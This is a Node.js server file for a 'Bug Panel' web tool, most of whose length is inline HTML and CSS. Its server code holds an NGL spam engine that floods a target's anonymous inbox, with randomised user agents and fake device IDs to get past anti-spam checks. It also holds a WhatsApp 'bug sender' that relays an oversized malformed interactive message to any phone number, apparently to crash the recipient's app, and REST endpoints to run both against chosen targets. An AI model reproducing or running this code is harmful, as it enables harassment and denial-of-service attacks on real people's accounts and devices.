// language: JavaScript, file: server.js
// deps: express, @whiskeysockets/baileys, pino
// env: PORT, CHAT_URL, CHAT_SOCKET_URL
// run: node server.js

const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const P = require('pino');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  delay,
  Browsers,
} = require('@whiskeysockets/baileys');

const app = express();
const PORT = process.env.PORT || 3000;
const CHAT_URL = process.env.CHAT_URL || 'http://127.0.0.1:2030';
app.use(express.json({ limit: '2mb' }));

// ═══════════════════════════════════════════════════════
//  NGL SPAM ENGINE — FIXED (UUID v4 + JSON parse)
// ═══════════════════════════════════════════════════════
const NGL_URL = 'https://ngl.link/api/submit';
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
];
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// proper UUID v4 — NGL backend validates format
function uuidv4() {
  const b = crypto.randomBytes(16);
  b[6] = (b[6] & 0x0f) | 0x40;
  b[8] = (b[8] & 0x3f) | 0x80;
  const h = b.toString('hex');
  return `${h.slice(0,8)}-${h.slice(8,12)}-${h.slice(12,16)}-${h.slice(16,20)}-${h.slice(20,32)}`;
}

const ngl = {
  isRunning: false, counter: 0, failed: 0, statusLog: 'idle',
  timer: null, target: '', message: '', total: 0, startedAt: 0, logs: [],
  lastError: '',
};
function nglLog(text, type = 'info') {
  const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
  ngl.logs.push({ time, text, type });
  if (ngl.logs.length > 200) ngl.logs.shift();
  console.log(`[NGL][${type}] [${time}] ${text}`);
}

async function nglSend(username, message) {
  const deviceId = uuidv4();          // FIX: real UUID v4
  const ua = pick(USER_AGENTS);

  const body = new URLSearchParams({
    username,
    question: message,
    deviceId,
    gameSlug: '',
    referrer: 'https://ngl.link/' + username,
  }).toString();

  try {
    const res = await fetch(NGL_URL, {
      method: 'POST',
      headers: {
        'User-Agent': ua,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': `https://ngl.link/${username}`,
        'Origin': 'https://ngl.link',
        'sec-ch-ua': '"Chromium";v="120", "Not(A:Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
      },
      body,
      signal: AbortSignal.timeout(12000),
    });

    const raw = await res.text();
    let json = null;
    try { json = JSON.parse(raw); } catch (_) {}

    // FIX: trust JSON payload, not just HTTP status
    const ok = res.status === 200 && (
      json?.success === true ||
      typeof json?.id === 'string' ||
      typeof json?.questionId === 'string' ||
      (!json?.error && !json?.message?.match?.(/rate|limit|spam/i))
    );

    if (ok) {
      ngl.counter++;
      ngl.statusLog = `[${ngl.counter}] terkirim`;
      nglLog(`[${ngl.counter}/${ngl.total}] ${username} — OK`, 'success');
      return { ok: true, status: 200 };
    }

    if (res.status === 429 || /rate|limit|spam/i.test(raw)) {
      ngl.failed++;
      ngl.lastError = 'ratelimit';
      nglLog(`Ratelimit — wait 6s`, 'error');
      await sleep(6000);
      return { ok: false, status: 429 };
    }

    ngl.failed++;
    ngl.lastError = `${res.status}: ${raw.slice(0, 120)}`;
    nglLog(`Gagal (${res.status}): ${raw.slice(0, 100)}`, 'error');
    await sleep(1500);
    return { ok: false, status: res.status };
  } catch (e) {
    ngl.failed++;
    ngl.lastError = e.message;
    nglLog(`Network error: ${e.message}`, 'warn');
    await sleep(2000);
    return { ok: false, status: 0, reason: e.message };
  }
}

function nglStart(username, message, total, delayMs = 2000) {
  if (ngl.isRunning) return { ok: false, error: 'Already running' };
  if (!username || !message) return { ok: false, error: 'username & message required' };

  const cleanUser = String(username)
    .replace(/^@/, '')
    .replace(/^https?:\/\/ngl\.link\//, '')
    .replace(/[/?#].*$/, '')
    .trim();

  if (!cleanUser) return { ok: false, error: 'invalid target' };

  ngl.isRunning = true;
  ngl.counter = 0; ngl.failed = 0;
  ngl.target = cleanUser; ngl.message = message;
  ngl.total = total || 100; ngl.startedAt = Date.now();
  ngl.logs = []; ngl.statusLog = 'running'; ngl.lastError = '';
  nglLog(`campaign start → @${cleanUser} × ${ngl.total}`, 'info');

  const tick = async () => {
    if (!ngl.isRunning) return;
    if (ngl.counter + ngl.failed >= ngl.total) {
      ngl.isRunning = false; ngl.statusLog = 'done';
      nglLog(`SELESAI — ${ngl.counter} sukses, ${ngl.failed} gagal`, 'success');
      return;
    }
    await nglSend(cleanUser, message);
    if (ngl.isRunning) {
      ngl.timer = setTimeout(tick, delayMs + Math.random() * 800);
    }
  };
  tick();

  return { ok: true, target: cleanUser, total: ngl.total };
}

function nglStop() {
  ngl.isRunning = false;
  if (ngl.timer) { clearTimeout(ngl.timer); ngl.timer = null; }
  ngl.statusLog = 'stopped';
  nglLog('Dihentikan manual', 'warn');
  return { ok: true, counter: ngl.counter, failed: ngl.failed };
}

// ═══════════════════════════════════════════════════════
//  WHATSAPP ENGINE — baileys + pairing
// ═══════════════════════════════════════════════════════
const AUTH_DIR = path.join(__dirname, 'wa_auth');
const wa = { sock: null, connected: false, pairingCode: null, number: null, jid: null, starting: false, logs: [] };
function waLog(text, type = 'info') {
  const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
  wa.logs.push({ time, text, type });
  if (wa.logs.length > 200) wa.logs.shift();
  console.log(`[WA][${type}] ${text}`);
}

async function startWA(rawNumber) {
  if (wa.starting) return { ok: false, error: 'already starting' };
  wa.starting = true;
  wa.pairingCode = null;
  wa.connected = false;

  const number = String(rawNumber).replace(/\D/g, '');
  if (number.length < 8) { wa.starting = false; return { ok: false, error: 'bad number' }; }
  wa.number = number;

  try {
    if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
    fs.mkdirSync(AUTH_DIR, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      auth: state,
      browser: Browsers.ubuntu('Chrome'),
      generateHighQualityLinkPreview: false,
      syncFullHistory: false,
    });
    wa.sock = sock;

    if (typeof sock.generateMessageTag !== 'function') {
      sock.generateMessageTag = () => crypto.randomBytes(16).toString('hex').toUpperCase();
    }

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (u) => {
      const { connection, lastDisconnect } = u || {};
      if (connection === 'open') {
        wa.connected = true;
        wa.jid = sock.user?.id || null;
        waLog('connected: ' + wa.jid, 'success');
      }
      if (connection === 'close') {
        wa.connected = false;
        const code = lastDisconnect?.error?.output?.statusCode;
        waLog('closed, code=' + code, 'warn');
      }
    });

    if (!sock.authState.creds.registered) {
      await delay(1800);
      const code = await sock.requestPairingCode(number);
      wa.pairingCode = code;
      waLog('pairing code: ' + code, 'info');
    } else {
      waLog('already registered', 'info');
    }

    wa.starting = false;
    return { ok: true, code: wa.pairingCode };
  } catch (e) {
    wa.starting = false;
    waLog('startWA error: ' + e.message, 'error');
    return { ok: false, error: e.message };
  }
}

function waStop() {
  try { if (wa.sock) wa.sock.ws?.close(); } catch (_) {}
  wa.sock = null; wa.connected = false; wa.pairingCode = null; wa.jid = null;
  waLog('stopped manually', 'warn');
  return { ok: true };
}

// ═══════════════════════════════════════════════════════
//  BUG SENDER — sendUiBlank (UNCHANGED)
// ═══════════════════════════════════════════════════════
async function sendUiBlank(sock, target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: { title: "#895 Marga Faridz" },
            body: { text: "Lari.. Ada Faridz" },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                key: "value".repeat(2000),
                id: Date.now(),
              }),
            },
          },
          contextInfo: {
            remoteJid: target,
            participant: target,
            stanzaId: sock.generateMessageTag(),
          },
        },
      },
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log("✅ Pesan terkirim tanpa error!");
  } catch (error) {
    console.log("❌ error:\n" + error);
  }
}

// ═══════════════════════════════════════════════════════
//  REST API
// ═══════════════════════════════════════════════════════
app.post('/api/ngl/start', (req, res) => {
  const { username, message, total } = req.body;
  res.json(nglStart(username, message, parseInt(total) || 100));
});
app.post('/api/ngl/stop', (req, res) => res.json(nglStop()));
app.get('/api/ngl/status', (req, res) => {
  const elapsed = ngl.startedAt ? ((Date.now() - ngl.startedAt) / 1000).toFixed(1) : 0;
  res.json({
    isRunning: ngl.isRunning, counter: ngl.counter, failed: ngl.failed,
    total: ngl.total, target: ngl.target, statusLog: ngl.statusLog,
    elapsed: parseFloat(elapsed), lastError: ngl.lastError,
    logs: ngl.logs.slice(-40),
  });
});
app.post('/api/ngl/reset', (req, res) => {
  nglStop();
  ngl.counter = 0; ngl.failed = 0; ngl.logs = []; ngl.startedAt = 0;
  ngl.statusLog = 'idle';
  res.json({ ok: true });
});

app.post('/api/wa/pair', async (req, res) => {
  const { number } = req.body || {};
  if (!number) return res.json({ ok: false, error: 'number required' });
  res.json(await startWA(number));
});
app.get('/api/wa/status', (req, res) => {
  res.json({
    connected: wa.connected, pairingCode: wa.pairingCode,
    number: wa.number, jid: wa.jid, starting: wa.starting,
    logs: wa.logs.slice(-40),
  });
});
app.post('/api/wa/logout', (req, res) => res.json(waStop()));

app.post('/api/bug/send', async (req, res) => {
  if (!wa.sock || !wa.connected) return res.json({ ok: false, error: 'WA not connected' });
  const raw = String(req.body?.target || '').trim();
  if (!raw) return res.json({ ok: false, error: 'target required' });

  let jid;
  if (raw.includes('@')) jid = raw;
  else {
    const clean = raw.replace(/\D/g, '');
    if (clean.length < 8) return res.json({ ok: false, error: 'bad number' });
    jid = clean + '@s.whatsapp.net';
  }
  const t0 = Date.now();
  try {
    await sendUiBlank(wa.sock, jid);
    res.json({ ok: true, jid, ms: Date.now() - t0 });
  } catch (e) {
    res.json({ ok: false, error: e.message, jid });
  }
});

app.get('/api/config', (req, res) => res.json({ chatUrl: CHAT_URL }));

// ═══════════════════════════════════════════════════════
//  HTML — inline
// ═══════════════════════════════════════════════════════
const HTML = String.raw`<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>REVOLT SinTax — Bug Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Bangers&family=Comic+Neue:wght@400;700&family=Poppins:wght@400;500;600;700;900&display=swap" rel="stylesheet">
<style>
:root{--ink:#16131f;--paper:#fff6d6;--yellow:#ffdf6b;--red:#e91e3c;--blue:#2d6cdf;--green:#00b85c;--pink:#ff4d94;--nav-h:66px;}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{height:100vh;height:100dvh;height:100svh;overflow:hidden;font-family:'Poppins',sans-serif;background:#08090d;overscroll-behavior:none;}
body{display:flex;justify-content:center;align-items:center;}
#login-view{position:fixed;inset:0;display:flex;justify-content:center;align-items:center;padding:20px;z-index:1000;background:url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1920&q=80') no-repeat center center/cover;transition:opacity .4s;}
#login-view.hidden{opacity:0;pointer-events:none;}
.login-card{width:100%;max-width:380px;padding:40px 30px;border-radius:16px;background:rgba(255,255,255,.08);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,.18);box-shadow:0 8px 32px 0 rgba(0,0,0,.37);display:flex;flex-direction:column;align-items:center;color:#fff;}
.login-card h2{font-size:2rem;font-weight:600;margin-bottom:30px;}
.form-container{width:100%;}
.input-box{width:100%;margin-bottom:18px;position:relative;}
.input-box input{width:100%;padding:12px 16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.25);border-radius:8px;outline:none;color:#fff;font-size:.95rem;transition:all .3s;}
.input-box input::placeholder{color:rgba(255,255,255,.6);}
.input-box input:focus{border-color:rgba(255,255,255,.8);background:rgba(255,255,255,.1);}
.input-box .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;color:rgba(255,255,255,.7);font-size:.85rem;user-select:none;}
.options{display:flex;justify-content:space-between;align-items:center;width:100%;font-size:.82rem;margin-bottom:25px;color:rgba(255,255,255,.9);}
.remember-me{display:flex;align-items:center;gap:6px;cursor:pointer;}
.remember-me input[type="checkbox"]{accent-color:#fff;cursor:pointer;}
.forgot-pass{color:rgba(255,255,255,.9);text-decoration:none;}
.btn-login{width:100%;padding:12px;background:#fff;border:none;border-radius:8px;color:#333;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;box-shadow:0 4px 15px rgba(0,0,0,.2);}
.btn-login:active{transform:scale(.98);}
.login-error{color:#ff5252;font-size:.82rem;text-align:center;margin-bottom:10px;min-height:18px;font-weight:600;}
.register-link{margin-top:25px;font-size:.82rem;color:rgba(255,255,255,.85);text-align:center;}
.register-link a{color:#fff;text-decoration:none;font-weight:500;}
.demo-hint{margin-top:14px;font-size:.7rem;color:rgba(255,255,255,.55);text-align:center;}
.demo-hint b{color:#ffcc00;}

.app-container{width:100%;max-width:412px;height:100vh;height:100dvh;height:100svh;max-height:915px;position:relative;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 0 30px rgba(0,0,0,.8);background:#08090d;}
@media(min-width:500px){.app-container{border-radius:28px;height:880px;max-height:880px;border:2px solid rgba(255,255,255,.1);}}
.view-section{flex:1;overflow-y:auto;display:none;padding-bottom:calc(var(--nav-h) + 30px);-webkit-overflow-scrolling:touch;}
.view-section.active{display:block;}

.comic-bg{background-color:var(--yellow);background-image:radial-gradient(circle, rgba(0,0,0,.85) 1.4px, transparent 1.4px),radial-gradient(circle, rgba(0,0,0,.85) 1.4px, transparent 1.4px);background-size:14px 14px,14px 14px;background-position:0 0,7px 7px;min-height:100%;}

#dashboard-1{padding:12px;}
.hero-panel{background:linear-gradient(135deg,#ffd23f,#ff8a3d);border:6px solid var(--ink);box-shadow:8px 8px 0 var(--ink);padding:20px 16px;text-align:center;position:relative;overflow:hidden;margin-bottom:14px;transform:rotate(-1deg);}
.hero-panel::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 12px,rgba(0,0,0,.06) 12px,rgba(0,0,0,.06) 14px);pointer-events:none;}
.hero-panel h1{font-family:'Bangers',Impact,sans-serif;font-size:2.6rem;color:#fff;-webkit-text-stroke:3px var(--ink);text-shadow:5px 5px 0 var(--ink);letter-spacing:3px;position:relative;z-index:1;line-height:1;}
.hero-panel .sub{font-family:'Bangers',Impact,sans-serif;font-size:1rem;color:var(--ink);letter-spacing:3px;margin-top:6px;position:relative;z-index:1;}
.hero-avatar{width:80px;height:80px;border-radius:50%;border:5px solid var(--ink);box-shadow:4px 4px 0 var(--ink);object-fit:cover;margin-bottom:10px;position:relative;z-index:1;background:#fff;}
.comic-panel{background:#fff;border:5px solid var(--ink);box-shadow:7px 7px 0 var(--ink);padding:14px;margin-bottom:14px;position:relative;}
.comic-section-title{font-family:'Bangers',Impact,sans-serif;font-size:1.4rem;color:var(--ink);letter-spacing:2px;margin-bottom:10px;display:flex;align-items:center;gap:8px;}
.comic-section-title::before{content:"⚡";color:var(--red);}
.avatar-scroll{display:flex;gap:10px;overflow-x:auto;padding-bottom:6px;}
.avatar-scroll::-webkit-scrollbar{display:none;}
.avatar-item{display:flex;flex-direction:column;align-items:center;flex-shrink:0;}
.avatar-circle{width:52px;height:52px;border-radius:50%;background:#fff;border:4px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;justify-content:center;align-items:center;font-family:'Bangers',Impact,sans-serif;font-size:1.3rem;color:var(--red);margin-bottom:4px;}
.avatar-item span{font-family:'Bangers',Impact,sans-serif;font-size:.75rem;color:var(--ink);letter-spacing:1px;}
.user-row{display:flex;align-items:center;gap:12px;margin-bottom:12px;}
.user-row .avatar-box{width:52px;height:52px;border-radius:50%;border:4px solid var(--ink);box-shadow:3px 3px 0 var(--ink);background:linear-gradient(135deg,#ffd23f,#ff8a3d);display:flex;justify-content:center;align-items:center;font-family:'Bangers',Impact,sans-serif;font-size:1.5rem;color:#fff;-webkit-text-stroke:1.5px var(--ink);flex-shrink:0;}
.user-row .info h4{font-family:'Bangers',Impact,sans-serif;font-size:1.3rem;color:var(--ink);letter-spacing:1.5px;line-height:1.1;word-break:break-word;}
.badge-reseller{background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.7rem;padding:3px 10px;border-radius:12px;letter-spacing:1.5px;display:inline-block;margin-top:3px;border:2px solid var(--ink);box-shadow:2px 2px 0 var(--ink);}
.temp-badge{margin-left:auto;background:#fff;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:4px 10px;font-family:'Bangers',Impact,sans-serif;font-size:.85rem;color:var(--ink);flex-shrink:0;}
.vps-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
.vps-box{background:#fff6d6;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:10px;}
.vps-box h5{font-family:'Bangers',Impact,sans-serif;font-size:.95rem;color:var(--red);letter-spacing:1.5px;margin-bottom:5px;}
.vps-box p{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.75rem;color:var(--ink);line-height:1.4;}
.quick-header{display:flex;justify-content:space-between;align-items:center;margin:6px 0 12px;}
.quick-title{background:#fff;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:6px 14px;font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:2px;color:var(--ink);display:flex;align-items:center;gap:6px;}
.quick-title::before{content:"⚡";color:#ff9800;}
.view-toggle{display:flex;background:#fff;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:3px;gap:3px;}
.view-toggle span{font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1.5px;padding:4px 10px;border-radius:4px;color:var(--ink);}
.view-toggle span.on{background:var(--yellow);}
.menu-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px;}
.menu-card{border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);padding:12px;min-height:112px;position:relative;overflow:hidden;cursor:pointer;transition:transform .08s, box-shadow .08s;}
.menu-card:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
.menu-card .icon-box{width:36px;height:36px;border-radius:8px;background:rgba(0,0,0,.25);border:2px solid var(--ink);display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:22px;}
.menu-card .tag-pill{position:absolute;top:10px;right:10px;background:var(--ink);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.62rem;letter-spacing:1.5px;padding:3px 8px;border-radius:10px;}
.menu-card h4{font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;line-height:1.05;text-shadow:1px 1px 0 rgba(0,0,0,.2);}
.menu-card p{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.65rem;margin-top:3px;opacity:.92;line-height:1.3;}
.mc-red{background:linear-gradient(135deg,#ff2e63,#d81b4a);color:#fff;}
.mc-green{background:linear-gradient(135deg,#00e676,#00b85c);color:#0a1010;}
.mc-orange{background:linear-gradient(135deg,#ffb300,#ff7a00);color:#1a0a00;}
.mc-cyan{background:linear-gradient(135deg,#00e5ff,#00b3cc);color:#0a1010;}
.mc-pink{background:linear-gradient(135deg,#ff4d94,#d81b5c);color:#fff;}
.mc-yellow{background:linear-gradient(135deg,#ffd54f,#ffb300);color:#1a0a00;}
.mc-orange2{background:linear-gradient(135deg,#ff8a65,#ff5722);color:#fff;}
.mc-dark{background:linear-gradient(135deg,#455a64,#263238);color:#fff;}
.mc-purple{background:linear-gradient(135deg,#7c4dff,#5a2ed6);color:#fff;}
.mc-maroon{background:linear-gradient(135deg,#c2185b,#8e0038);color:#fff;}
.sholat-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px;}
.sholat-title{background:var(--yellow);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:5px 12px;font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;color:var(--ink);}
.sholat-next{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.78rem;color:var(--ink);}
.sholat-next b{color:var(--red);}
.sholat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
.sholat-item{background:var(--paper);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:10px 6px;text-align:center;}
.sholat-item.active{background:var(--yellow);}
.sholat-item .ic{font-size:1.2rem;}
.sholat-item .nm{font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1px;color:var(--ink);margin-top:2px;}
.sholat-item .tm{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;color:var(--red);margin-top:2px;}
.news-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
.news-title{background:var(--yellow);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:5px 12px;font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;color:var(--ink);}
.news-all{font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1.5px;color:#c2185b;background:#fff;border:3px solid var(--ink);box-shadow:2px 2px 0 var(--ink);padding:4px 10px;border-radius:12px;cursor:pointer;}
.news-box{background:#fff;border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);overflow:hidden;}
.news-img{height:130px;background:linear-gradient(135deg,#2a1f4a,#1a1430);display:flex;align-items:center;justify-content:center;position:relative;font-size:3rem;}
.news-img .badge{position:absolute;top:10px;right:10px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1.5px;padding:4px 10px;border-radius:8px;border:2px solid var(--ink);box-shadow:2px 2px 0 var(--ink);}
.news-body{padding:12px;}
.news-body .ttl{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;line-height:1.15;letter-spacing:.5px;color:var(--ink);}
.news-body .meta{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.7rem;color:#666;margin-top:8px;display:flex;align-items:center;gap:5px;}

#dashboard-2{padding:12px;}
.header-panel{background:var(--red);border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:12px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px;}
.header-panel .menu-btn{font-family:'Bangers',Impact,sans-serif;color:#fff;font-size:1rem;letter-spacing:2px;}
.music-pill{margin-left:auto;background:#000;color:#ffdf6b;border:3px solid var(--ink);padding:4px 12px;font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1.5px;border-radius:20px;}
.bug-header-panel{background:#fff;border:5px solid var(--ink);box-shadow:7px 7px 0 var(--ink);padding:18px;text-align:center;margin-bottom:14px;position:relative;overflow:hidden;}
.bug-header-panel::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 14px,rgba(0,0,0,.04) 14px,rgba(0,0,0,.04) 16px);pointer-events:none;}
.bug-header-panel h3{font-family:'Bangers',Impact,sans-serif;font-size:2rem;color:var(--red);-webkit-text-stroke:1.5px var(--ink);text-shadow:3px 3px 0 var(--ink);letter-spacing:4px;position:relative;z-index:1;}
.status-badges{display:flex;justify-content:center;gap:8px;margin-top:10px;position:relative;z-index:1;flex-wrap:wrap;}
.badge-online,.badge-edition{font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1.5px;padding:4px 12px;border-radius:12px;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);}
.badge-online{background:var(--green);color:#fff;}
.badge-edition{background:#00d2ff;color:var(--ink);}
.tab-nav{display:flex;background:#fff;border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);padding:5px;gap:5px;margin-bottom:14px;}
.tab-btn{flex:1;padding:8px;background:transparent;border:none;font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;color:var(--ink);cursor:pointer;border-radius:6px;transition:all .15s;}
.tab-btn.active{background:var(--red);color:#fff;border:2px solid var(--ink);}
.bug-card{background:#fff;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:16px;margin-bottom:14px;position:relative;}
.bug-card-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;}
.bug-title{font-family:'Bangers',Impact,sans-serif;font-size:1.4rem;color:var(--ink);letter-spacing:2px;line-height:1;}
.bug-sub{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.8rem;color:var(--red);margin-top:3px;}
.tag-rec{background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.65rem;letter-spacing:1.5px;padding:3px 9px;border-radius:6px;border:2px solid var(--ink);display:inline-block;}
.tag-mod{background:var(--ink);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.65rem;letter-spacing:1.5px;padding:3px 9px;border-radius:6px;margin-top:5px;border:2px solid var(--ink);display:inline-block;}
.bug-desc{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.82rem;color:var(--ink);margin-bottom:12px;line-height:1.4;}
.feature-tags{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;}
.ft-item{background:#fff6d6;border:2px solid var(--ink);padding:3px 9px;border-radius:6px;font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1px;color:var(--ink);}
.btn-start-module{width:100%;padding:11px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.1rem;letter-spacing:2px;border:4px solid var(--ink);box-shadow:5px 5px 0 var(--ink);cursor:pointer;transition:transform .08s,box-shadow .08s;}
.btn-start-module:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}

#module-form-page{padding:12px;padding-bottom:160px;}
#bug-sender-page{padding:12px;}
#chat-room-page{padding:0;background:#08090d;height:100%;display:flex;flex-direction:column;}
.chat-room-bar{display:flex;align-items:center;gap:10px;padding:10px 12px;background:#111a26;border-bottom:3px solid var(--ink);color:#fff;flex-shrink:0;}
.chat-room-bar button{background:#1e2c3a;color:#fff;border:2px solid var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;padding:6px 12px;cursor:pointer;border-radius:6px;}
.chat-room-bar button:active{transform:translate(2px,2px);}
.chat-room-bar .ttl{flex:1;font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;color:#ffd93b;}
.chat-room-bar .st{font-family:'Poppins',sans-serif;font-size:.7rem;color:#8892b0;}
#chatFrame{flex:1;width:100%;border:0;background:#fff;}
.chat-room-hint{padding:14px;text-align:center;color:#8892b0;font-family:'Poppins',sans-serif;font-size:.85rem;}
.chat-room-hint b{color:#ff4d6a;}
.chat-room-hint .btn-open{margin-top:12px;display:inline-block;padding:10px 18px;background:#ff4d6a;color:#fff;border-radius:10px;font-weight:700;cursor:pointer;text-decoration:none;}

.back-link{display:inline-block;font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;color:var(--ink);background:#fff;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:6px 14px;margin-bottom:14px;cursor:pointer;}
.back-link:active{transform:translate(3px,3px);box-shadow:0 0 0 var(--ink);}
.form-label{font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;color:var(--ink);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
.input-wrapper{position:relative;display:flex;align-items:center;}
.input-field{width:100%;padding:12px;background:var(--paper);border:3px solid var(--ink);font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.95rem;color:var(--ink);outline:none;}
.input-field::placeholder{color:rgba(0,0,0,.4);}
.btn-paste{position:absolute;right:6px;background:var(--yellow);border:2px solid var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1px;padding:5px 10px;cursor:pointer;color:var(--ink);box-shadow:2px 2px 0 var(--ink);}
.btn-paste:active{transform:translate(2px,2px);box-shadow:0 0 0 var(--ink);}
.bug-selection-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;}
.bug-opt{background:var(--paper);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:14px 8px;text-align:center;cursor:pointer;transition:transform .08s,box-shadow .08s;position:relative;}
.bug-opt:active{transform:translate(3px,3px);box-shadow:0 0 0 var(--ink);}
.bug-opt.active{background:var(--red);color:#fff;}
.bug-opt .opt-icon{font-size:1.6rem;display:block;margin-bottom:4px;}
.bug-opt .opt-name{font-family:'Bangers',Impact,sans-serif;font-size:.9rem;letter-spacing:1.5px;color:var(--ink);}
.bug-opt.active .opt-name{color:#fff;}
